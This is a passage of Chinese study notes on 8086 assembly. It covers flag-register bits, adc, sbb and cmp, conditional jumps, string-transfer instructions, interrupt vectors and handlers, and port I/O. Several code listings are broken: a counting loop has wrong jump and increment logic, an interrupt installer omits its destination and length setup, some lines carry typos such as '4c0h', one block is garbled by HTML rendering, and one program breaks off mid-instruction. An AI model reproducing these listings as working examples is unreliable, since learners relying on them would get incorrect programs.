al,al//(al)=30H,CF=1,CF记录了从最高有效位向跟高位的进位值<br>add al,al//(al)=60H,CF=0<br><br>mov al,97H<br>sub al,98H//(al)=FFH,CF=1，CF记录了向更高位的借位值<br>sub al,al//(al)=0,CF=0<br></code></pre></td></tr></table></figure><h3 id="11-5-OF-标志"><a href="#11-5-OF-标志" class="headerlink" title="11.5 OF 标志"></a>11.5 OF 标志</h3><p>flag 第 11 位是 OF，溢出标志位。OF 记录有符号数运算的结果是否发生溢出。溢出 OF &#x3D; 1，没有 OF &#x3D; 0           </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,0F0H<br>add al,88H<br>//执行后，CF=1，OF=1.无符号运算,0F0H+88H有进位,CF=1;有符号运算,0F0H+88H发生溢出,OF=1<br><br>mov al,0F0H<br>add al,78H<br>//CF=1,OF=0.无符号运算0F0H+78H有进位,CF=1;有符号运算,0F0H+78H不发生溢出,OF=0<br></code></pre></td></tr></table></figure><p>e.g 下列每条指令执行后，ZF 、PF、SF、CF、OF等标志位的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al,al//ZF=1,PF=1,SF=0,CF=0,OF=0<br>mov al,10H//11000<br>add al,90H//01100<br>mov al,80H//01100<br>add al,80H//11011<br>mov al,0FCH//11011<br>add al,05H//00010<br>mov al,7DH//00010<br>add al,0BH//01101<br></code></pre></td></tr></table></figure><h3 id="11-6-adc-指令"><a href="#11-6-adc-指令" class="headerlink" title="11.6 adc 指令"></a>11.6 adc 指令</h3><p><strong>adc 为带进位加法指令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">格式:adc 操作对象1,操作对象2<br>功能:操作对象1 = 操作对象1 + 操作对象2 + CF<br>//指令: adc ax,bx<br>//(ax)=(ax)+(bx)+CF<br></code></pre></td></tr></table></figure><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2<br>mov bx,1<br>sub bx,ax<br>adc ax,1<br>//(ax)=4,(ax)+1+CF=4<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1<br>add ax,ax<br>adc ax,3<br>//(ax)=2+3+0=5<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,98H<br>add al,al<br>adc al,3<br>//(al)=34H,(al)+3+CF=30H+3+1=34H<br></code></pre></td></tr></table></figure><p><strong>执行 adc 指令时，CF 的值如果是被 sub 指令设置的，那么就是借位值</strong></p><p><strong>add 指令设置时，是进位值</strong></p><p>加法可以分两部进行：</p><ul><li>低位相加，比如 0198H 和 0183H。低位相加得 1B</li><li>高位相加再加上低位相加的进位值。01+01+1&#x3D;03</li></ul><p>e.g 计算 1EF0001000H + 2010001EF0H，结果放在 ax(最高 16 位)，bx(次高 16 位)，cx(低 16 位)中</p><ul><li>先将低 16 位相加，然后 CF 中记录本次相加的进位值</li><li>再将高 16 位和 CF 相加，然后 CF记录进位值</li><li>最后高 16 位和 CF相加，CF记录进位值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,001EH<br>mov bx,0F000H<br>mov cx,1000H<br>add cx,1EF0H<br>add bx,1000H<br>add ax,0020H<br></code></pre></td></tr></table></figure><h3 id="11-7-sbb指令"><a href="#11-7-sbb指令" class="headerlink" title="11.7 sbb指令"></a>11.7 sbb指令</h3><p><strong>sbb 是带借位减法指令，利用 CF 位上记录的借位值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sbb 操作对象1，操作对象2<br>操作对象1 = 操作对象1 - 操作对象2 - CF<br>//sbb ax,bx<br>//(ax)=(ax)-(bx)-CF<br></code></pre></td></tr></table></figure><p>e.g 计算 003E1000H - 00202000H,结果放在 ax,bx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ax,003EH<br>sub bx,2000H<br>sbb ax,0020H<br></code></pre></td></tr></table></figure><h3 id="11-8-cmp-指令"><a href="#11-8-cmp-指令" class="headerlink" title="11.8 cmp 指令"></a>11.8 cmp 指令</h3><p><strong>cmp 为比较指令，相当于减法，但不保存结果。执行后会对标志寄存器产生影响。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">格式：cmp 操作对象1，操作对象2<br>功能：计算操作对象1 - 操作对象2，不保存结果，仅仅根据计算结果对标志寄存器进行设置<br>//cmp ax,ax<br>//结果为 0 ，指令执行后 zf=1,pf=1,sf=0,cf=0,of=0<br></code></pre></td></tr></table></figure><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,8<br>mov bx,3<br>cmp ax,bx<br>//(ax)=8,zf=0,pf=1,sf=0,cf=0,of=0<br></code></pre></td></tr></table></figure><p><strong>对于 cmp ax,bx，有如下分析</strong></p><ul><li><pre><code class="assembly">if (ax==bx),(ax)-(bx)=0,zf=1if (ax!=bx),(ax)-(bx)!=0,zf=0if (ax&lt;bx),(ax)-(bx)&lt;0,产生借位,cf=1if (ax&gt;=bx),(ax)-(bx)&gt;=0,cf=0if (ax&gt;bx),(ax)-(bx)&gt;0,cf=0 或 zf=0if (ax&lt;=bx),(ax)-(bx)&lt;=0,cf=1 或 zf=1 if:    zf=1,说明 (ax)=(bx)    zf=0,(ax)!=(bx)    cf=1,(ax)&lt;(bx)    cf=0,(ax)&gt;=(bx)    cf=0 且 zf=0,(ax)&gt;(bx)    cf=1 或 zf=1,(ax)&lt;=(bx)<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br><br>对有符号数进行比较时<br><br>**对于<span class="hljs-keyword">cmp</span> <span class="hljs-number">ah</span>,<span class="hljs-number">bh</span>**<br><br><span class="hljs-string">```</span>assembly<br>if (<span class="hljs-number">ah</span>==<span class="hljs-number">bh</span>),(<span class="hljs-number">ah</span>)-(<span class="hljs-number">bh</span>)=<span class="hljs-number">0</span>,zf=<span class="hljs-number">1</span><br>if (<span class="hljs-number">ah</span>!=<span class="hljs-number">bh</span>),(<span class="hljs-number">ah</span>)-(<span class="hljs-number">bh</span>)!=<span class="hljs-number">0</span>,zf=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><ol><li><p>如果 sf &#x3D;1,of&#x3D;0</p><p>of &#x3D;0，没有溢出，逻辑上真正结果的正负 &#x3D; 实际结果的正负</p><p>sf &#x3D;1，实际结果为负数，所以逻辑上真正的结果为负，(ah)&lt;(bh)</p></li><li><p>如果 sf &#x3D;1，of &#x3D;1</p><p>of &#x3D;1，有溢出，逻辑上真正结果的正负与实际结果的正负不相等</p><p>sf &#x3D;1，实际结果为负</p><p><strong>如果因为溢出导致实际结果为负，那么逻辑上真正的结果为正（ah)&gt;(bh)</strong></p></li><li><p>如果 sf &#x3D; 0,of &#x3D; 1</p><p>sf&#x3D;0，实际结果为非负，而 of &#x3D;1 说明有溢出 ，结果为非 0 ，实际结果为正</p><p><strong>如果因为溢出导致实际结果为非负，那么逻辑上真正结果为负，（ah)&lt;(bh)</strong></p></li><li><p>sf &#x3D;0,of &#x3D;0</p><p>没有溢出，实际结果为非负，（ah)&gt;&#x3D;(bh)</p></li></ol><h3 id="11-9-检测比较结果的条件转移指令"><a href="#11-9-检测比较结果的条件转移指令" class="headerlink" title="11.9 检测比较结果的条件转移指令"></a>11.9 检测比较结果的条件转移指令</h3><p>“ 转移 ”指它能修改 IP，“ 条件 ”指它可以根据某种条件，决定是否修改 IP</p><table><thead><tr><th>指令</th><th>含义</th><th>检测的相关标志位</th></tr></thead><tbody><tr><td>je</td><td>等于则转移</td><td>zf &#x3D; 1</td></tr><tr><td>jne</td><td>不等于就转移</td><td>zf &#x3D; 0</td></tr><tr><td>jb</td><td>低于则转移</td><td>cf &#x3D;1</td></tr><tr><td>jnb</td><td>不低于就转移</td><td>cf &#x3D; 0</td></tr><tr><td>ja</td><td>高于就转移</td><td>cf &#x3D; 0且 zf &#x3D;0</td></tr><tr><td>jna</td><td>不高于就转移</td><td>cf &#x3D;1 或 zf &#x3D; 1</td></tr></tbody></table><p><strong>e.g</strong>  统计 data 段中数值小于 8 的字节的个数，用 ax 保存统计结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,data<br>mov ds,ax<br>mov ax,0<br>mov bx,0<br>mov cx,8<br>s:cmp byte ptr [bx],8<br>jnb next<br>inc ax<br>next:inc bx<br>loop s<br>//(ax)=2<br></code></pre></td></tr></table></figure><p>统计 F000:0 处 32 个字节中，大小在 [32,128] 的数据个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0f000h<br>mov ds,ax<br>mov bx,0<br>mov dx,0<br>mov cx,32<br>s:mov al,[bx]<br>cmp al,32<br>ja s0<br>cmp al,128<br>ja s0<br>inc bx<br>s0:inc bx<br>loop s<br></code></pre></td></tr></table></figure><h3 id="11-10-DF-标志和串传送指令"><a href="#11-10-DF-标志和串传送指令" class="headerlink" title="11.10 DF 标志和串传送指令"></a>11.10 DF 标志和串传送指令</h3><p>flag 第 10 位，方向标志位。在串处理指令中，控制每次操作后 si ,di 的增减</p><p>df &#x3D; 0  每次操作后 si、di 递增</p><p>df &#x3D;1  每次操作后 si、di 递减</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movsb<br>相当于:<br>((es)*16+(di))=((ds)*16)+si<br>如果 df=0: (si)=(si)+1<br>(di)=(di)+1<br>如果 df=1: (si)=(si)-1<br>(di)=(di)-1<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movsw<br>将ds:si指向的内存单元中的字送入es:di中，根据标志寄存器df位的值，将si和di递增2或递减2<br></code></pre></td></tr></table></figure><p>8086 CPU 提供两条指令对 df 位进行设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cld 指令:将标志寄存器的df位置0<br>std 指令:将标志寄存器df位置1<br></code></pre></td></tr></table></figure><p>e.g 用串传送指令，将 F000H 段中的最后 16 个字符复制到 data 段中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br> db 16 dup (0)<br>data ends<br>mov ax,0f000h<br>mov ds,ax<br>mov si,0ffffh//ds:si 指向 f000:ffff<br>mov ax,data<br>mov es,ax<br>mov di,15//es:di 指向 data:000f<br>mov cx,16//(cx)=16,rep 循环16次<br>std//设置 df=1,逆向传送<br>rep movsb<br></code></pre></td></tr></table></figure><h3 id="11-11-push-和-popf"><a href="#11-11-push-和-popf" class="headerlink" title="11.11 push 和 popf"></a>11.11 push 和 popf</h3><p>pushf 是将标志寄存器的值压栈，popf 是出栈送入标志寄存器中</p><p>e.g  （ax)&#x3D;？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0<br>push ax<br>popf<br>mov ax,0fff0h<br>add ax,0010h<br>pushf<br>pop ax//0 0 0 0 of df if tf sf zf 0 af 0 pf 0 cf<br>//0 0 0 0 0  0  *  *  0 1  0  * 0 1  0  1<br>//ax=flag=000000**010*0101b<br>and al,11000101B//al=01000101b=45h<br>and ah,00001000B//ah=00000000b=0h<br>//ax=45h<br></code></pre></td></tr></table></figure><p>11.12 标志寄存器在 Debug 中的表示</p><table><thead><tr><th>标志</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>of</td><td>OV</td><td>NV</td></tr><tr><td>sf</td><td>NG</td><td>PL</td></tr><tr><td>zf</td><td>ZR</td><td>NZ</td></tr><tr><td>pf</td><td>PE</td><td>PO</td></tr><tr><td>cf</td><td>CY</td><td>NC</td></tr><tr><td>df</td><td>DN</td><td>UP</td></tr></tbody></table><h1 id="十二、内中断"><a href="#十二、内中断" class="headerlink" title="十二、内中断"></a>十二、内中断</h1><h3 id="12-1-内中断的产生"><a href="#12-1-内中断的产生" class="headerlink" title="12.1 内中断的产生"></a>12.1 内中断的产生</h3><p>对于 8086CPU ，有以下情况会产生中断</p><ul><li>除法错误，比如 div 指令产生的除法溢出</li><li>单步执行</li><li>into 指令</li><li>int 指令</li></ul><p>中断源在 8086CPU 中的中断类型</p><ul><li>除法错误：0</li><li>单步执行：1</li><li>into 指令：4</li><li>int 指令，格式为 int  n，n 为字节型立即数，是提供给 CPU 的中断类型码</li></ul><h3 id="12-3-中断向量表"><a href="#12-3-中断向量表" class="headerlink" title="12.3 中断向量表"></a>12.3 中断向量表</h3><p>对于 8086PC 机，中断向量表指定放在内存地址 0 处。从内存 0000:0000 到 0000:03FF 的 1024 个单元中存放着中断向量表。</p><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000:0000 68 10 A7 00 8B 01 70 00-16 00 9D 03 8B 01 70 00<br>//3号中断源对应的中断处理程序的入口地址为: 0070:018B<br></code></pre></td></tr></table></figure><p><strong>一个表项存放一个中断向量，也就是一个中断处理程序的入口地址，入口地址包括段地址和偏移地址，一个表项占两个字，高地址存放段地址，低地址存放偏移地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">存储 N 号中断源对应的中断处理程序入口的偏移地址的内存单元的地址为:4N<br>段地址的内存单元地址为:4N+2<br></code></pre></td></tr></table></figure><h3 id="12-4-中断过程"><a href="#12-4-中断过程" class="headerlink" title="12.4 中断过程"></a>12.4 中断过程</h3><p>8086CPU 中断过程</p><ul><li>取得字段类型码 N</li><li>标志寄存器入栈，TF&#x3D;0,IF&#x3D;0</li><li>push CS</li><li>push IP</li><li>( IP ) &#x3D; ( N * 4 ) , ( CS ) &#x3D; ( N * 4 + 2 )</li></ul><h3 id="12-5-中断处理程序和-iret-指令"><a href="#12-5-中断处理程序和-iret-指令" class="headerlink" title="12.5 中断处理程序和 iret 指令"></a>12.5 中断处理程序和 iret 指令</h3><p>中断处理程序的编写方法</p><ul><li>保存用到的寄存器</li><li>处理中断</li><li>恢复用到的寄存器</li><li>用 iret 指令返回</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop IP<br>pop CS<br>popf<br></code></pre></td></tr></table></figure><p><strong>在中断过程中，寄存器入栈顺序是标志寄存器，CS，IP。iret 出栈顺序是 IP，CS，标志寄存器</strong></p><h3 id="12-9-do0"><a href="#12-9-do0" class="headerlink" title="12.9 do0"></a>12.9 do0</h3><p>do0 程序的主要任务是显示字符串</p><p>e.g 显示“ overflow！”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>code segment<br>start:mov ax,cs<br>mov ds,ax<br>mov si,offset do0//设置 ds:si 指向源地址<br>mov ax,0<br>mov es,ax<br>mov di,200h//设置 es:di 指向目的地址<br>mov cx,offset do0end-offset do0//设置 cx 为传输长度<br>cld//传输方向为正<br>rep movsb<br>设置中断向量表<br><br>mov ax,4c0h<br>int 21h<br><br>   do0:jmp short do0start//”overflow！”不是可执行代码，jmp 转移到正式 do0 程序。除法发生溢出时，CPU 执行0:200处的 jmp 指令，跳过后面字符串，转到正式 do0 程序执行<br>   db &quot;overflow!&quot;<br>  do0start:mov ax,cs<br>  mov ds,ax<br>  mov si,202h//ds:si指向字符串，jmp 指令占两个字节，所以偏移地址为 202h<br>  <br>  mov ax,0b800h<br>  mov es,ax<br>  mov di,12*160+36*2//es:di指向显存空间的中间位置<br>  <br>  mov cx,9//cx为字符串长度<br>  s:mov al,[si]<br>  mov es:[di],al<br>  inc si<br>  add di,2<br>  loop s<br>  <br>  mov ax,4c00h<br>  int 21h<br>  <br>de0end:nop<br>code:ends<br>end start<br>//将标号 do0 到标号 do0end 之间的内容送到 0000:0200处  <br></code></pre></td></tr></table></figure><h3 id="12-10-设置中断向量"><a href="#12-10-设置中断向量" class="headerlink" title="12.10 设置中断向量"></a>12.10 设置中断向量</h3><p>将 do0 的入口地址 0:200 写入中断向量表的 0 号表项中，使 do0 成为  0 号中断的中断处理程序</p><p>0 号表项的地址为 0：0，其中 0：0 字单元存放偏移地址，0：2字单元存放段地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0<br>mov es,ax<br>mov word ptr es:[0*4],200h<br>mov word ptr es:[0*4+2],0<br></code></pre></td></tr></table></figure><h3 id="12-11-单步中断"><a href="#12-11-单步中断" class="headerlink" title="12.11 单步中断"></a>12.11 单步中断</h3><p>CPU 在执行完一条指令后，如果检测到标志寄存器的 TF 位为 1，则产生单步中断，引发中断过程。</p><ul><li>取得中断类型码为 1</li><li>标志寄存器入栈，TF、IF 设置为 0</li><li>CS、IP 入栈</li><li>（IP）&#x3D;（1*4），（CS）&#x3D;（1*4+2）</li></ul><h1 id="十三、int-指令"><a href="#十三、int-指令" class="headerlink" title="十三、int 指令"></a>十三、int 指令</h1><h3 id="13-1-int-指令"><a href="#13-1-int-指令" class="headerlink" title="13.1 int 指令"></a>13.1 int 指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">int n<br></code></pre></td></tr></table></figure><h3 id="13-2-编写中断例程"><a href="#13-2-编写中断例程" class="headerlink" title="13.2 编写中断例程"></a>13.2 编写中断例程</h3><p>安装中断 7ch 的中断例程</p><p>功能：将一个全是字母，以 0 结尾的字符串，转化为大写</p><p>参数：ds:si 指向字符串的首地址</p><p>eg. 将 data 段中的字符串转化为大写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>data segment<br>db &#x27;conversation&#x27;,0<br>data ends<br>code segment<br>start:mov ax,data<br>mov ds,ax<br>mov si,0<br>int 7ch<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>安装程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br><br>start:mov ax,cs<br>mov ds,ax<br>mov si,offset capital<br>cld<br>rep movsb<br><br>mov ax,0<br>mov es,ax<br>mov word ptr es:[7ch*4],200h<br>mov word ptr es:[7ch*4+2],0<br>mov ax,4c00h<br>int 21h<br><br> capital:push cx<br> push si<br> change:mov cl,[si]<br> mov ch,0<br> jcxz ok<br> and byte ptr [si],11011111b<br> inc si<br> jmp short change<br> ok:pop si<br> pop cx<br> iret<br>capitalend:nop<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="13-3-对-int、iret-和栈的理解"><a href="#13-3-对-int、iret-和栈的理解" class="headerlink" title="13.3 对 int、iret 和栈的理解"></a>13.3 对 int、iret 和栈的理解</h3><p>e.g 在屏幕中显示 80 个 “ ! ”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,0b800h<br> mov es,ax<br> mov di,160*12<br> <br> mov bx,offset s-offset se//从标号 se 到标号 s 的转移位移<br> mov cx,80<br> s:mov byte ptr es:[di],&#x27;!&#x27;<br> add di,2<br> int 7ch//(cx)!=0，转移到标号 s 处<br> se:nop<br> mov ax,4c0h<br> int 21h<br> code ends<br> end start<br></code></pre></td></tr></table></figure><h3 id="13-4-BIOS-和-DOS-所提供的中断例程"><a href="#13-4-BIOS-和-DOS-所提供的中断例程" class="headerlink" title="13.4 BIOS 和 DOS 所提供的中断例程"></a>13.4 BIOS 和 DOS 所提供的中断例程</h3><p>在系统板的 ROM 位置存放一套程序，BIOS （基本输入输出系统），主要包含以下内容：</p><ul><li>硬件系统的检测和初始化程序</li><li>外部中断和内部中断的中断例程</li><li>用于硬件设备进行 I&#x2F;O 操作的中断例程</li><li>其他和硬件系统相关的中断例程</li></ul><p>&#x2F;&#x2F;e.g 下面程序在第2、4、6、8行显示 4 句英文诗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> s1:db &#x27;Good,better,best,&#x27;,&#x27;$&#x27;<br> s2:db &#x27;Never let it rest,&#x27;,&#x27;$&#x27;<br> s3:db &#x27;Till good is better,&#x27;,&#x27;$&#x27;<br> s4:db &#x27;And better,best.&#x27;,&#x27;$&#x27;<br> s:dw offset s1,offset s2,offset s3,offset s4<br>   row:db 2,4,6,8<br>   <br>  start:mov ax,cs<br>  mov ds,ax<br>  mov bx,offset s<br>  mov si,offset row<br>  mov cx,4<br>  ok:mov bh,0<br>  mov dh,<br>   <br></code></pre></td></tr></table></figure><h1 id="十四、端口"><a href="#十四、端口" class="headerlink" title="十四、端口"></a>十四、端口</h1><p>寄存器相同特点：</p><ul><li>都和 CPU 总线相连，通过它们所在的芯片进行</li><li>CPU 对它们进行读或写的时候都通过控制线向它们所在的芯片发出端口号读写命令</li></ul><p>CPU 可以直接读写以下地方的数据：</p><ul><li>CPU 内部的寄存器</li><li>内存单元</li><li>端口</li></ul><h3 id="14-1-端口的读写"><a href="#14-1-端口的读写" class="headerlink" title="14.1 端口的读写"></a>14.1 端口的读写</h3><p>1）访问内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,ds:[8]//假设执行前(ds)=0<br></code></pre></td></tr></table></figure><ul><li>CPU 通过地址线将地址信息 8 发出</li><li>CPU 通过控制线发出内存读命令，选中存储器芯片，通知他它要从中读取数据</li><li>存储器将 8 号单元中的数据通过数据线送入 CPU</li></ul><p>2）访问端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al,60h//从 60h 号端口读入一个字节<br></code></pre></td></tr></table></figure><ul><li>CPU 通过地址线将地址信息 60h 发出</li><li>CPU 通过控制线发出端口命令，选中端口所在的芯片，通知他要从中读取数据</li><li>端口所在的芯片将 60h 端口中的数据通过数据线送入 CPU</li></ul><p>在 in 和 out 指令中，只能用 ax 和 al 来存放从端口中读入的数据或要发送到端口的数据。访问 8 位端口时用 al ,访问 16 位用 ax</p><p>对0~255以内端口进行读写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al,20h//从 20h 端口读入一个字节<br>out 20h,al//往 20h 端口写入一个字节<br></code></pre></td></tr></table></figure><p>对 256~65535 的端口进行读写，端口号放在 dx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov dx,3f8h//将端口号 3f8h 送入 dx<br>in al,dx//读入<br>out dx,al//写入<br></code></pre></td></tr></table></figure><h3 id="14-2-CMOS-RAM-芯片"><a href="#14-2-CMOS-RAM-芯片" class="headerlink" title="14.2 CMOS RAM 芯片"></a>14.2 CMOS RAM 芯片</h3><ul><li>包含一个实时钟和一个有 128 个存储单元的 RAM 存储器</li><li>128 个字节的 RAM 中，内部实时钟占用 0~0dh 单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时 BIOS 程序读取</li><li>芯片内部有两个端口，存放要访问的 CMOS RAM 单元的地址；71h 为数据端口，存放从选定的 CMOS RAM 单元中读取的数据，或要写入到其中的数据。CPU 对 CMOS RAM 的读写分两步进行，读 